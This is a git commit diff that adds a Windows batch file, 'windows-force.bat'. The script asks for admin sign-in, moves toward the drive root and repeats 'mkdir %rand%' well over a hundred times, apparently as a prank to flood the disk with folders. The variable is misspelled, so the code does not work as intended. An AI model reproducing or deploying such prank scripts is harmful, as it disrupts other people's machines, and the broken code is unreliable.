4a002123cd7019377f313fb0ad0caea0378273e5
RiversideRocks <59586759+RiversideRocks@users.noreply.github.com>
2020-08-24 14:50:22 -0400

    Update windows-force.bat

--- windows-force.bat
+++ windows-force.bat
@@ -1,1 +1,330 @@
+@echo off
+echo Make sure you are signed in as the admin user.
+cd..
+cd..
+cd..
+mkdir %rand%
 
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
+
+mkdir %rand%
